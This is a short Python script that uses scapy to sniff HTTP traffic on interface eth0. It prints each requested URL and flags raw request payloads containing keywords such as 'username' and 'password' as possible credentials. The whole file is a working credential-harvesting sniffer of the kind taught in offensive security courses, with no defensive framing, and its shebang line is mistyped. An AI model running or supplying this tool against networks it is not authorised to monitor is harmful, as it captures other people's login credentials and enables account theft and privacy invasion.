#1/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # iface is the interface we want to sniff on
    # store is to not store packets in memory
    # prn is the callback function
    # filter is to filter packets based on port


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)  # str() to convert to string python3 compatible
        keywords = ["username", "user", "email", "mail", "name", "uname", "login", "password", "pass", "word"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request to ->" + url.decode())  # decode similar to str() python3 compatible
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password -> " + login_info + "\n\n")


sniff("eth0")
